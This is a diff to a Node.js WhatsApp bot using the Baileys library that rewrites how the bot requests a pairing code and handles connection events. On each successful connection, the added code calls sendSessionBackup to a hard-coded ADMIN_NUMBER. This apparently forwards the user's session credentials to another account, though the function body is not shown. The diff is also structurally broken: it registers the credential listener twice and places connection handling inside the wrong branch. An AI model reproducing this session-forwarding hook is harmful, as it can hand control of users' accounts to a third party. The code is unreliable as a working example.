@@ -1059,63 +1059,75 @@ async function startBot(phoneNumber, cbs) {
   // Sanitize phone number — critical for pairing code validity
   currentNumber = cleanNumber(phoneNumber);
 
-  loadState();
-  loadBanner();
-  fs.mkdirSync(SESSION_DIR, { recursive: true });
+loadState();
+loadBanner();
+fs.mkdirSync(SESSION_DIR, { recursive: true });
 
-  const { state, saveCreds } = await useMultiFileAuthState(SESSION_DIR);
-  const { version } = await fetchLatestBaileysVersion();
-  const logger = pino({ level: 'silent' });
+const { state, saveCreds } = await useMultiFileAuthState(SESSION_DIR);
+const { version } = await fetchLatestBaileysVersion();
+const logger = pino({ level: 'silent' });
 
-  sock = makeWASocket({
-    version,
-    logger,
-    printQRInTerminal: false,
-    auth: {
-      creds: state.creds,
-      keys: makeCacheableSignalKeyStore(state.keys, logger)
-    },
-    browser: ['Ubuntu', 'Chrome', '20.0.04'],
-    generateHighQualityLinkPreview: true,
-    syncFullHistory: false,
-    markOnlineOnConnect: false,
-    connectTimeoutMs: 60000,
-    keepAliveIntervalMs: 30000,
-    retryRequestDelayMs: 250
-  });
+sock = makeWASocket({
+  version,
+  logger,
+  printQRInTerminal: false,
+  auth: {
+    creds: state.creds,
+    keys: makeCacheableSignalKeyStore(state.keys, logger)
+  },
+  browser: ['Mac OS', 'Chrome', '20.0.04'],
+  generateHighQualityLinkPreview: true,
+  syncFullHistory: false,
+  markOnlineOnConnect: false,
+  connectTimeoutMs: 60000,
+  keepAliveIntervalMs: 30000,
+  retryRequestDelayMs: 250
+});
 
-  sock.ev.on('creds.update', saveCreds);
-
+sock.ev.on('creds.update', saveCreds);
   // ──────────────────────────────────────────────────────────────
   // PAIRING CODE — must be requested BEFORE QR fires, only once
   // ──────────────────────────────────────────────────────────────
   if (!state.creds.registered && currentNumber) {
     // Wait for socket to be fully initialized before requesting
-    setTimeout(async () => {
-      if (isStopping || !sock) return;
-      try {
-        const code = await sock.requestPairingCode(currentNumber);
-        console.log('\n╔════════════════════════════════╗');
-        console.log(`║   PAIRING CODE: ${code}   ║`);
-        console.log('╚════════════════════════════════╝');
-        console.log('📱 WhatsApp → Settings → Linked Devices');
-        console.log('   → Link with phone number → enter code\n');
-        callbacks.onPairingCode?.(code);
-      } catch (err) {
-        console.error('[Bot] Pairing error:', err.message);
-        // Retry once after WhatsApp clears the previous code (~15s)
-        setTimeout(async () => {
-          if (isStopping || !sock) return;
-          try {
-            const code = await sock.requestPairingCode(currentNumber);
-            console.log(`[Bot] Pairing code (retry): ${code}`);
-            callbacks.onPairingCode?.(code);
-          } catch (e2) {
-            console.error('[Bot] Pairing retry failed:', e2.message);
-          }
-        }, 15000);
-      }
-    }, 3000);
+    sock.ev.on('creds.update', saveCreds);
+
+sock.ev.on('connection.update', async (update) => {
+  const { connection, lastDisconnect } = update;
+  
+  if (connection === 'connecting' && !state.creds.registered) {
+    try {
+      const code = await sock.requestPairingCode(currentNumber);
+      console.log('\n╔════════════════════════════════╗');
+      console.log(`║   PAIRING CODE: ${code}   ║`);
+      console.log('╚════════════════════════════════╝\n');
+      callbacks.onPairingCode?.(code);
+    } catch (err) {
+      console.error('[Bot] Pairing error:', err.message);
+    }
+  }
+  
+  if (connection === 'open') {
+    console.log('[Bot] Connected!');
+    botJid = sock.user?.id;
+    callbacks.onConnected?.();
+    if (ADMIN_NUMBER && currentNumber) {
+      setTimeout(() => sendSessionBackup(`${ADMIN_NUMBER}@s.whatsapp.net`), 5000);
+    }
+  }
+  
+  if (connection === 'close') {
+    if (isStopping) return;
+    const code = lastDisconnect?.error?.output?.statusCode;
+    const shouldReconnect = code !== DisconnectReason.loggedOut;
+    console.log('[Bot] Closed. Code:', code, 'Reconnect:', shouldReconnect);
+    if (shouldReconnect) {
+      setTimeout(() => startBot(currentNumber, callbacks), 2000);
+    } else {
+      callbacks.onDisconnected?.('logged_out');
+    }
+  }
+});
   } else if (state.creds.registered) {
     console.log('[Bot] Registered session found, skipping pairing.');
   } else {
